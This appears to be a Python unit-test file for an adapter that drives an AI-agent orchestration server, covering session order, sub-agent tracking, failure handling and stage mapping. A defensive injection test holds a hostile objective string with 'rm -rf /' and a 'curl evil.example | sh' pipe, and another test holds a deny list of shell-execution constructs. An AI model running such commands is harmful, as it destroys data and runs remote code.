"""Talking to Omnigent: the sequence, the safety, and the named failures.

The SDK is mocked throughout. No test in this repository may need a live model,
a running server or a credential, and the whole point of the adapter is that the
contract it speaks is small enough to mock honestly: resolve an agent, resolve a
runner, create a session, bind it, post a message, stream events.

The sharpest test here is `test_a_hostile_objective_arrives_byte_for_byte`. The
objective is a person's text, and the one thing that must never happen is for it
to become syntax. There is no subprocess on this path, and the test asserts both
the absence of the import and the arrival of the exact bytes.
"""
import inspect
import json
import sys
import types
import unittest
from pathlib import Path

from biosense import contracts as K
from biosense.production import discovery as DISC
from biosense.production import omnigent_runtime as OMNI
from biosense.production import runtime as RT
from biosense.production import stages as ST

HOSTILE = (
    "Increase yield; rm -rf / && curl evil.example | sh `whoami` $(id) "
    "\"quoted\" 'single' \\backslash\n newline --flag=1"
)


# ── a mock SDK, shaped like the real one ────────────────────────────────
class _Agent:
    def __init__(self, id='ag_1', harness='claude-sdk'):
        self.id, self.harness = id, harness


class _Session:
    def __init__(self, sid='conv_1', harness='claude-sdk'):
        self.id = sid
        self.harness = harness
        self.llm_model = 'anthropic/claude-sonnet'
        self.status = 'idle'
        self.last_task_error = None


class _Resp:
    def __init__(self, status, body):
        self.status_code = status
        self._body = body
        self.text = json.dumps(body)

    def json(self):
        return self._body


class _Http:
    """The shared httpx client, as much of it as the adapter uses."""

    def __init__(self, outer):
        self.outer = outer

    async def get(self, url):
        if url.endswith('/v1/hosts'):
            return _Resp(200, {'hosts': self.outer.hosts})
        return _Resp(404, {})

    async def post(self, url, json=None):
        self.outer.posted_create = json
        if self.outer.host_create_status >= 400:
            return _Resp(self.outer.host_create_status, {'error': 'refused'})
        return _Resp(200, {'id': 'conv_host_1', 'harness': 'claude-sdk',
                           'llm_model': 'anthropic/claude'})


class _Sessions:
    """Records what the adapter did, so the sequence can be asserted."""

    def __init__(self, outer):
        self.outer = outer
        self.calls = []
        self._http = _Http(outer)
        self._base = "http://127.0.0.1:6767"

    async def resolve_agent(self, name):
        self.calls.append(('resolve_agent', name))
        if self.outer.agent_missing:
            raise LookupError(f'No agent named {name!r} is registered on this server.')
        return _Agent()

    async def resolve_online_runner(self, harness=None, canonicalize=None):
        self.calls.append(('resolve_online_runner', harness))
        return None if self.outer.no_runner else 'runner_1'

    async def create_from_agent_id(self, agent_id, title=None, workspace=None):
        self.calls.append(('create', agent_id, title, workspace))
        return _Session()

    async def bind_runner(self, sid, runner_id=None):
        self.calls.append(('bind', sid, runner_id))
        return _Session()

    async def post_event(self, sid, event):
        self.calls.append(('post_event', sid, event))
        if self.outer.post_raises:
            raise self.outer.post_raises
        return {'queued': True}

    async def stream(self, sid):
        self.calls.append(('stream', sid))
        for ev in self.outer.events:
            yield ev

    async def get(self, sid):
        self.calls.append(('get', sid))
        return _Session()

    async def interrupt(self, sid):
        self.calls.append(('interrupt', sid))


class _Client:
    def __init__(self, outer, base_url=None, headers=None, timeout=None):
        self.outer = outer
        self.base_url = base_url
        self.headers = headers or {}
        self.sessions = getattr(outer, 'sessions_cls', _Sessions)(outer)

    async def close(self):
        pass


class _Harness:
    """Stands in for the installed omnigent_client module."""

    def __init__(self):
        self.events = []
        self.no_runner = False
        self.agent_missing = False
        self.post_raises = None
        self.last_client = None
        self.hosts = []
        self.posted_create = None
        self.host_create_status = 200

    def install(self, test):
        mod = types.ModuleType('omnigent_client')

        def factory(base_url, headers=None, auth=None, timeout=30.0):
            c = _Client(self, base_url=base_url, headers=headers, timeout=timeout)
            self.last_client = c
            return c

        mod.OmnigentClient = factory
        sys.modules['omnigent_client'] = mod
        test.addCleanup(sys.modules.pop, 'omnigent_client', None)
        return self


def setUpModule():
    """Shrink the idle-confirmation delay.

    The adapter deliberately confirms more than once, with a pause, that a
    session has really stopped — a momentary idle between turns must not end a
    run. The pause is a production safety margin and nothing is asserted about
    its length, so the tests run with it at zero.
    """
    global _SAVED
    _SAVED = (OMNI.IDLE_RECHECK_S, OMNI.STREAM_POLL_S, OMNI.CHILD_POLL_S, OMNI.TURN_QUIET_S)
    OMNI.IDLE_RECHECK_S, OMNI.STREAM_POLL_S, OMNI.CHILD_POLL_S = 0.0, 0.01, 0.0
    OMNI.TURN_QUIET_S = 0.05


def tearDownModule():
    (OMNI.IDLE_RECHECK_S, OMNI.STREAM_POLL_S, OMNI.CHILD_POLL_S,
     OMNI.TURN_QUIET_S) = _SAVED


def cfg_for(mode='local_real_ai', **env):
    base = {'BIOSENSE_RUNTIME_MODE': 'local', 'BIOSENSE_ALLOWED_RUNTIMES': 'local,synthetic'}
    base.update(env)
    return RT.from_env(env=base)


def ev(etype, **fields):
    return dict(fields, type=etype)


# ── the safety properties ───────────────────────────────────────────────
class InjectionTests(unittest.TestCase):
    def test_no_discovery_module_shells_out(self):
        """The prohibited design, asserted rather than trusted.

        Checked against the constructs themselves rather than the word
        "subprocess", which appears in a docstring saying there isn't one.
        """
        from biosense.production import discovery_runner as DR
        banned = ('import subprocess', 'from subprocess', 'subprocess.run',
                  'subprocess.Popen', 'subprocess.call', 'subprocess.check',
                  'shell=True', 'os.system(', 'os.popen(', 'os.execv', 'pty.spawn')
        for mod in (DISC, DR, ST, OMNI):
            src = inspect.getsource(mod)
            for b in banned:
                self.assertNotIn(b, src, f'{mod.__name__} uses {b}')

    def test_a_hostile_objective_arrives_byte_for_byte(self):
        """It travels as a JSON string value, so there is nothing to escape."""
        h = _Harness().install(self)
        h.events = [ev('response.completed')]
        req = DISC.build(project_id='ipsc_macrophage', objective=HOSTILE,
                         runtime_mode='local_real_ai')
        brief = DISC.render_brief(req, loop_dir='ai-test')
        OMNI.drive(cfg_for(), brief, title='t')
        posted = next(c for c in h.last_client.sessions.calls if c[0] == 'post_event')
        text = posted[2]['data']['content'][0]['text']
        self.assertIn(HOSTILE, text, 'the objective was altered on the way out')
        self.assertEqual('message', posted[2]['type'])
        self.assertEqual('user', posted[2]['data']['role'])

    def test_the_token_travels_as_a_header_and_nowhere_else(self):
        h = _Harness().install(self)
        h.events = [ev('response.completed')]
        cfg = RT.from_env(env={'BIOSENSE_RUNTIME_MODE': 'remote',
                               'BIOSENSE_OMNIGENT_SERVER': 'https://omni.example',
                               'BIOSENSE_OMNIGENT_TOKEN': 'secret-token-xyz'})
        events = []
        OMNI.drive(cfg, 'brief text', on_event=events.append)
        self.assertEqual('Bearer secret-token-xyz',
                         h.last_client.headers.get('Authorization'))
        for e in events:
            self.assertNotIn('secret-token-xyz', repr(e))


class AsyncOrchestratorTests(unittest.TestCase):
    """A turn ending is not the session ending.

    The orchestrator is an async agent and its own instructions say to dispatch
    to a specialist and END THE TURN — the inbox wakes it when the answer comes
    back. So `response.completed` arrives seconds into a run, before any science
    has happened. Watching until the first one and calling the run finished is
    why a real run came back in thirty seconds having written nothing.
    """

    def _session_states(self, *states):
        """A fake whose reported status walks through *states* as it is polled."""
        seq = list(states)

        class _Walking(_Session):
            def __init__(inner):
                super().__init__()
                inner.status = seq[0]

        return seq, _Walking

    def test_a_completed_turn_does_not_end_the_run_while_the_session_works(self):
        h = _Harness().install(self)
        # Turn one: the orchestrator dispatches and ends its turn. Then the
        # specialist answers, the orchestrator wakes, works, and finishes.
        h.events = [
            ev('session.created'),
            ev('response.output_item.done',
               item={'type': 'function_call', 'name': 'sys_session_send',
                     'arguments': '{"title": "literature-it1"}'}),
            ev('response.completed'),
            ev('session.status', status='waiting'),
            ev('response.output_item.done',
               item={'type': 'function_call', 'name': 'bash',
                     'arguments': 'biosense.bioinformatics.cli execute --plan p.json'}),
            ev('response.completed'),
        ]
        events = []
        out = OMNI.drive(cfg_for(), 'brief', on_event=events.append)
        self.assertEqual('complete', out['terminal'])
        # The work AFTER the first turn was seen, which is the whole point.
        self.assertIn('running_analysis', out['stages_reached'])
        self.assertTrue(any(e.get('tool') == 'sys_session_send' for e in events))

    def test_the_end_of_a_turn_is_reported_as_waiting_not_as_finished(self):
        h = _Harness().install(self)
        h.events = [ev('response.completed')]
        events = []
        OMNI.drive(cfg_for(), 'brief', on_event=events.append)
        turn = [e for e in events if e.get('omnigent_type') == 'turn.completed']
        self.assertTrue(turn, 'the end of a turn was not reported')
        self.assertEqual('waiting', turn[0]['kind'])
        self.assertIn('turn 1', turn[0]['simple'])
        # And nothing claimed the run was complete at that moment.
        self.assertFalse([e for e in events
                          if e.get('kind') == 'terminal' and e.get('stage') == 'complete'])

    def test_a_failed_turn_still_ends_the_run_at_once(self):
        h = _Harness().install(self)
        h.events = [ev('response.failed', response={'error': {'message': 'the harness died'}})]
        out = OMNI.drive(cfg_for(), 'brief')
        self.assertEqual('failed', out['terminal'])
        self.assertIn('harness died', out['error'])

    def test_a_stop_request_is_honoured_while_waiting_between_turns(self):
        h = _Harness().install(self)
        h.events = [ev('response.completed')]
        out = OMNI.drive(cfg_for(), 'brief', should_stop=lambda: True)
        self.assertEqual('failed', out['terminal'])
        self.assertIn('stopped', out['error'])
        self.assertIn('interrupt', [c[0] for c in h.last_client.sessions.calls])

    def test_the_session_statuses_that_mean_still_working_are_the_servers_own(self):
        """Omnigent emits launching / running / waiting / idle / failed, and
        `waiting` is precisely "the parent turn is parked on sub-agent work"."""
        for live in ('launching', 'running', 'waiting'):
            self.assertIn(live, OMNI.SESSION_LIVE, live)
        self.assertIn('idle', OMNI.SESSION_DONE)
        self.assertNotIn('waiting', OMNI.SESSION_DONE)


class _TreeSessions(_Sessions):
    """A server with the sub-agent tree: one literature child that works for a
    few polls and then finishes. The parent's stream ends after its first turn,
    exactly as an async orchestrator's does."""

    def __init__(self, outer):
        super().__init__(outer)
        self.polls = 0
        self.parent_streams = 0

    async def child_sessions_tree(self, sid):
        self.calls.append(('tree', sid))
        self.polls += 1
        busy = self.polls <= self.outer.child_busy_polls
        task = 'in_progress' if busy else self.outer.child_end
        return [{'id': 'conv_lit', 'agent_name': 'literature', 'title': 'literature-it1',
                 'busy': busy, 'current_task_status': task,
                 'last_message_preview': '7 claims found'}]

    async def stream(self, sid):
        self.calls.append(('stream', sid))
        if sid == 'conv_lit':
            for e in self.outer.child_events:
                yield e
            return
        self.parent_streams += 1
        if self.parent_streams == 1:
            for e in self.outer.events:
                yield e


class AutoContinueTests(unittest.TestCase):
    """The orchestrator's loop prompt says to settle the request with the person
    first. In a web run nobody is there, so a turn that ends on a question ended
    the run empty — the reported "no specialist agent was asked"."""

    def test_an_orchestrator_waiting_for_a_person_is_told_once_to_proceed(self):
        h = _Harness().install(self)
        h.events = [
            ev('response.output_item.done',
               item={'type': 'message', 'role': 'assistant',
                     'content': [{'type': 'output_text',
                                  'text': 'What target yield and QC profile do you want?'}]}),
            ev('response.completed')]
        events = []
        out = OMNI.drive(cfg_for(), 'brief', on_event=events.append)
        posts = [c for c in h.last_client.sessions.calls if c[0] == 'post_event']
        self.assertEqual(2, len(posts), 'told more or less than once')
        text = posts[1][2]['data']['content'][0]['text']
        self.assertIn('nobody can answer', text)
        self.assertIn('sys_session_send', text)
        self.assertEqual(1, out['auto_continued'])
        self.assertIn('QC profile', out['last_message'])
        note = [e for e in events if e.get('omnigent_type') == 'biosense.auto_continue']
        self.assertEqual(1, len(note))
        self.assertIn('QC profile', note[0]['technical'])
        self.assertEqual('complete', out['terminal'])

    def test_an_orchestrator_that_dispatched_is_left_alone(self):
        h = _Harness().install(self)
        h.events = [ev('response.output_item.done',
                       item={'type': 'function_call', 'name': 'sys_session_send',
                             'arguments': '{"agent": "literature", "title": "literature-it1"}'}),
                    ev('response.completed')]
        out = OMNI.drive(cfg_for(), 'brief')
        posts = [c for c in h.last_client.sessions.calls if c[0] == 'post_event']
        self.assertEqual(1, len(posts))
        self.assertEqual(0, out['auto_continued'])


class SubAgentTests(unittest.TestCase):
    """A parent reads idle while its specialists work, and their work is not on
    its stream. Watching the parent alone ended runs early and showed nothing of
    what the specialists did."""

    def harness(self, busy_polls=4, end='completed', child_events=()):
        h = _Harness()
        h.sessions_cls = _TreeSessions
        h.child_busy_polls = busy_polls
        h.child_end = end
        h.child_events = list(child_events)
        h.events = [ev('session.created'),
                    ev('response.output_item.done',
                       item={'type': 'function_call', 'name': 'sys_session_send',
                             'arguments': '{"title": "literature-it1"}'}),
                    ev('response.completed')]
        return h.install(self)

    def test_an_idle_parent_with_a_working_child_is_not_finished(self):
        h = self.harness(busy_polls=4)
        events = []
        out = OMNI.drive(cfg_for(), 'brief', on_event=events.append)
        self.assertEqual('complete', out['terminal'])
        sess = h.last_client.sessions
        # Watched past the point the child finished, not stopped at the parent's idle.
        self.assertGreater(sess.polls, 4)
        states = [e['state'] for e in events if e.get('kind') == 'subagent']
        self.assertEqual(['started', 'finished'], states)
        self.assertEqual(1, out['sub_agents'])

    def test_a_childs_own_tool_calls_move_the_stages(self):
        h = self.harness(child_events=[
            ev('response.output_item.done',
               item={'type': 'function_call', 'name': 'bash',
                     'arguments': 'python -m biosense.bioinformatics.cli execute p.json'}),
            ev('response.output_item.done',
               item={'type': 'reasoning', 'summary': 'private chain of thought'}),
            ev('response.completed')])
        events = []
        out = OMNI.drive(cfg_for(), 'brief', on_event=events.append)
        self.assertIn('running_analysis', out['stages_reached'])
        tool = [e for e in events if e.get('kind') == 'tool' and e.get('agent') == 'literature']
        self.assertTrue(tool, 'the child tool call was not reported as the child\'s')
        # A child's reasoning is not shown, and its turn ending is not the run ending.
        self.assertFalse([e for e in events if e.get('kind') == 'reasoning'])
        self.assertEqual('complete', out['terminal'])
        self.assertIn(('stream', 'conv_lit'), h.last_client.sessions.calls)

    def test_a_child_that_died_is_reported_and_does_not_fail_the_run(self):
        self.harness(busy_polls=1, end='failed')
        events = []
        out = OMNI.drive(cfg_for(), 'brief', on_event=events.append)
        self.assertEqual('complete', out['terminal'])
        self.assertIn('failed', [e['state'] for e in events if e.get('kind') == 'subagent'])

    def test_stopping_a_run_stops_its_working_children(self):
        h = self.harness(busy_polls=10 ** 6)
        flag = {'n': 0}

        def stop():
            flag['n'] += 1
            return flag['n'] > 3
        out = OMNI.drive(cfg_for(), 'brief', should_stop=stop)
        self.assertEqual('failed', out['terminal'])
        self.assertIn(('interrupt', 'conv_lit'), h.last_client.sessions.calls)

    def test_a_server_without_the_tree_behaves_as_before(self):
        h = _Harness().install(self)
        h.events = [ev('response.completed')]
        out = OMNI.drive(cfg_for(), 'brief')
        self.assertEqual('complete', out['terminal'])
        self.assertEqual(0, out['sub_agents'])


# ── the sequence ────────────────────────────────────────────────────────
class SessionTests(unittest.TestCase):
    def test_the_documented_order_is_followed(self):
        h = _Harness().install(self)
        h.events = [ev('session.created'), ev('response.completed')]
        OMNI.drive(cfg_for(), 'brief', title='BioSense: a question')
        # The documented order, then the polls that ask the server whether the
        # session has really finished. Those polls are the fix for a run ending
        # at the orchestrator's first turn, so they belong in the sequence.
        names = [c[0] for c in h.last_client.sessions.calls]
        self.assertEqual(['resolve_agent', 'resolve_online_runner', 'create', 'bind',
                          'post_event', 'stream'], names[:6])
        # This orchestrator never dispatches, so it is told once that nobody will
        # answer (one more post_event, and a fresh tail). Nothing else is sent.
        self.assertEqual({'get', 'post_event', 'stream'}, set(names[6:]), names)
        self.assertEqual(2, names.count('post_event'))

    def test_the_session_records_what_a_run_needs_to_be_found_again(self):
        h = _Harness().install(self)
        h.events = [ev('response.completed')]
        seen = []
        out = OMNI.drive(cfg_for(), 'brief', on_session=seen.append)
        self.assertEqual('conv_1', out['session']['omnigent_session_id'])
        self.assertEqual('runner_1', out['session']['runner_id'])
        self.assertEqual('claude-sdk', out['session']['harness'])
        self.assertTrue(seen, 'the session id was not reported before the stream')

    def test_the_workspace_is_the_runner_cwd_not_a_guess(self):
        h = _Harness().install(self)
        h.events = [ev('response.completed')]
        OMNI.drive(cfg_for(), 'brief')
        create = next(c for c in h.last_client.sessions.calls if c[0] == 'create')
        self.assertEqual(str(K.ROOT), create[3])


# ── the named failures ──────────────────────────────────────────────────
class FailureTests(unittest.TestCase):
    def test_a_missing_sdk_names_the_extra_to_install(self):
        sys.modules['omnigent_client'] = None   # import machinery raises on None
        self.addCleanup(sys.modules.pop, 'omnigent_client', None)
        found = OMNI.probe(cfg_for())
        self.assertEqual('sdk_not_installed', found['reason'])
        self.assertIn('--extra omnigent', found['next_step'])

    def test_no_runner_is_its_own_reason_with_the_command_that_fixes_it(self):
        h = _Harness().install(self)
        h.no_runner = True
        found = OMNI.probe(cfg_for())
        self.assertEqual('no_runner_available', found['reason'])
        self.assertIn('omnigent host', found['next_step'])
        with self.assertRaises(RT.RuntimeUnavailable) as e:
            OMNI.drive(cfg_for(), 'brief')
        self.assertEqual('no_runner_available', e.exception.reason)

    def test_an_unregistered_agent_is_its_own_reason(self):
        h = _Harness().install(self)
        h.agent_missing = True
        found = OMNI.probe(cfg_for())
        self.assertEqual('agent_not_registered', found['reason'])
        self.assertIn('--agent discovery_loop', found['next_step'])

    def test_the_server_refusing_a_turn_is_classified_not_swallowed(self):
        """Verified against a real server: posting to an unbound session answers
        'No runner bound for session'."""
        h = _Harness().install(self)

        class ServerError(Exception):
            status_code = 500

        h.post_raises = ServerError('No runner bound for session')
        with self.assertRaises(RT.RuntimeUnavailable) as e:
            OMNI.drive(cfg_for(), 'brief')
        self.assertEqual('no_runner_available', e.exception.reason)

    def test_an_authentication_failure_is_distinguished_from_a_missing_credential(self):
        for status, want in ((401, 'auth_required'), (403, 'auth_invalid')):
            with self.subTest(status=status):
                h = _Harness().install(self)

                class Err(Exception):
                    status_code = None

                e = Err('nope')
                e.status_code = status
                h.post_raises = e
                code, _ = OMNI._classify(e)
                self.assertEqual(want, code)

    def test_an_unreachable_server_is_not_reported_as_a_bug(self):
        class ConnectError(Exception):
            pass

        code, _ = OMNI._classify(ConnectError('connection refused'))
        self.assertEqual('runtime_unreachable', code)

    def test_a_failed_turn_ends_the_run_as_failed_with_the_reason(self):
        h = _Harness().install(self)
        h.events = [ev('response.failed', source='llm',
                       response={'error': {'code': 'no_api_key',
                                           'message': 'ANTHROPIC_API_KEY is not set'}})]
        out = OMNI.drive(cfg_for(), 'brief')
        self.assertEqual('failed', out['terminal'])
        self.assertIn('ANTHROPIC_API_KEY', out['error'])
        self.assertEqual('model_auth_missing', OMNI.model_auth_reason(out['error']))


# ── event mapping ───────────────────────────────────────────────────────
class StageMappingTests(unittest.TestCase):
    def test_liveness_events_are_dropped(self):
        for t in ST.LIVENESS:
            self.assertIsNone(ST.map_event(ev(t)), t)

    def test_a_tool_call_moves_the_right_stage(self):
        cases = [
            ('sys_session_send', '{"title": "literature-it1"}', 'searching_literature'),
            ('sys_session_send', '{"title": "bioinformatics-it1"}', 'searching_datasets'),
            ('sys_session_send', '{"title": "analysis-it2"}', 'running_analysis'),
            ('sys_os_exec', '.venv/bin/python -m biosense.bioinformatics.cli plan --x',
             'planning_analysis'),
            ('sys_os_exec', '.venv/bin/python -m biosense.bioinformatics.cli execute --plan p',
             'running_analysis'),
            ('sys_os_exec', 'python -m biosense.production.cli advise --analysis a',
             'synthesizing_evidence'),
            ('sys_os_exec', 'python -m biosense.production.cli report --loop-dir d',
             'generating_report'),
            ('sys_os_exec', 'python -m biosense.production.cli simulate-standin --standin x',
             'testing_simulator'),
        ]
        for name, args, want in cases:
            with self.subTest(tool=name, args=args[:40]):
                self.assertEqual(want, ST.stage_for_tool(name, args))

    def test_a_tool_that_implies_nothing_moves_nothing(self):
        """Guessing a stage from `ls` would advance a tick on no evidence."""
        self.assertIsNone(ST.stage_for_tool('sys_os_exec', 'ls -la runs/'))
        self.assertIsNone(ST.stage_for_tool('sys_read_inbox', '{}'))

    def test_prose_never_moves_a_stage(self):
        """A sentence saying 'now I will search the literature' is a sentence."""
        mapped = ST.map_event(ev('response.output_item.done', item={
            'type': 'message', 'role': 'assistant',
            'content': [{'type': 'output_text',
                         'text': 'Now I will search the literature and run the analysis.'}]}))
        self.assertIsNone(mapped['stage'])

    def test_terminal_events_are_recognised(self):
        self.assertEqual('complete', ST.map_event(ev('response.completed'))['stage'])
        for t in ('response.failed', 'response.cancelled', 'response.incomplete'):
            self.assertEqual('failed', ST.map_event(ev(t, response={}))['stage'], t)

    def test_a_policy_refusal_is_shown_as_the_system_working(self):
        m = ST.map_event(ev('response.policy_denied', reason='outside the envelope'))
        self.assertEqual('refusal', m['kind'])
        self.assertIn('system working', m['simple'])

    def test_an_elicitation_asks_rather_than_answering_itself(self):
        m = ST.map_event(ev('response.elicitation_request', params={'q': 'which donor?'}))
        self.assertEqual('needs_human', m['kind'])

    def test_an_unknown_event_is_recorded_rather_than_dropped(self):
        m = ST.map_event(ev('response.something_new_in_0_17'))
        self.assertIsNotNone(m)
        self.assertEqual('note', m['kind'])

    def test_progress_is_monotone(self):
        """A late literature follow-up must not rewind the display to step three."""
        reached = {'searching_literature', 'building_hypothesis'}
        rows = {r['stage']: r['status'] for r in ST.progress(reached)}
        self.assertEqual('done', rows['searching_literature'])
        self.assertEqual('current', rows['building_hypothesis'])
        self.assertEqual('pending', rows['generating_report'])
        reached.add('searching_literature')
        rows2 = {r['stage']: r['status'] for r in ST.progress(reached)}
        self.assertEqual('current', rows2['building_hypothesis'])

    def test_a_completed_run_marks_what_it_never_reached_as_skipped(self):
        rows = {r['stage']: r['status']
                for r in ST.progress({'running_analysis'}, terminal='complete')}
        self.assertEqual('done', rows['running_analysis'])
        self.assertEqual('skipped', rows['generating_report'])

    def test_the_twelve_stages_are_the_ones_the_product_promises(self):
        self.assertEqual(
            ('understanding_objective', 'identifying_uncertainty', 'searching_literature',
             'searching_datasets', 'planning_analysis', 'running_analysis',
             'synthesizing_evidence', 'building_hypothesis', 'testing_simulator',
             'generating_report', 'complete', 'failed'), ST.STAGE_IDS)


if __name__ == '__main__':
    unittest.main()


class HostTopologyTests(unittest.TestCase):
    """`omnigent host` registers a host, not a runner.

    Checked against a real local server: after `omnigent host`, /v1/runners is
    empty and /v1/hosts holds an online host with a configured_harnesses map.
    An adapter that looks only for a runner refuses the documented `omnigent
    start` flow with a host sitting right there.
    """

    ONLINE = {'host_id': 'host_1', 'name': 'vm', 'status': 'online',
              'configured_harnesses': {'claude_sdk': True, 'codex-native': 'binary-missing'}}

    def test_an_online_host_is_an_executor_even_with_no_runner(self):
        h = _Harness().install(self)
        h.no_runner = True
        h.hosts = [self.ONLINE]
        found = OMNI.probe(cfg_for())
        self.assertTrue(found['ok'], found)
        self.assertEqual('host', found['executor'])
        self.assertEqual('host_1', found['host_id'])

    def test_a_host_session_is_created_with_the_host_and_the_workspace(self):
        """The server launches the runner from those two fields."""
        h = _Harness().install(self)
        h.no_runner = True
        h.hosts = [self.ONLINE]
        h.events = [ev('response.completed')]
        out = OMNI.drive(cfg_for(), 'brief text')
        self.assertEqual('host_1', h.posted_create['host_id'])
        self.assertEqual(str(K.ROOT), h.posted_create['workspace'])
        self.assertEqual('conv_host_1', out['session']['omnigent_session_id'])
        # and the brief still travelled as data
        posted = next(c for c in h.last_client.sessions.calls if c[0] == 'post_event')
        self.assertEqual('brief text', posted[2]['data']['content'][0]['text'])

    def test_a_host_whose_harness_needs_authentication_says_exactly_that(self):
        """Much better than 'no runner': the machine is there, the key is not."""
        h = _Harness().install(self)
        h.no_runner = True
        h.hosts = [{**self.ONLINE, 'configured_harnesses': {'claude_sdk': 'needs-auth'}}]
        found = OMNI.probe(cfg_for())
        self.assertEqual('model_auth_missing', found['reason'])
        self.assertIn('ANTHROPIC_API_KEY', found['next_step'])
        self.assertIn('needs-auth', found['detail'])

    def test_an_offline_host_is_not_an_executor(self):
        h = _Harness().install(self)
        h.no_runner = True
        h.hosts = [{**self.ONLINE, 'status': 'offline'}]
        self.assertEqual('no_runner_available', OMNI.probe(cfg_for())['reason'])

    def test_a_host_without_the_agents_harness_is_not_an_executor(self):
        h = _Harness().install(self)
        h.no_runner = True
        h.hosts = [{**self.ONLINE, 'configured_harnesses': {'codex-native': True}}]
        found = OMNI.probe(cfg_for())
        self.assertEqual('no_runner_available', found['reason'])
        self.assertIn('claude-sdk', found['detail'])

    def test_a_bound_runner_still_takes_precedence(self):
        h = _Harness().install(self)
        h.hosts = [self.ONLINE]
        found = OMNI.probe(cfg_for())
        self.assertEqual('runner', found['executor'])
        self.assertEqual('runner_1', found['runner_id'])

    def test_a_refused_host_launch_is_reported_rather_than_swallowed(self):
        h = _Harness().install(self)
        h.no_runner = True
        h.hosts = [self.ONLINE]
        h.host_create_status = 422
        with self.assertRaises(RT.RuntimeUnavailable) as e:
            OMNI.drive(cfg_for(), 'brief')
        self.assertIn('422', str(e.exception))
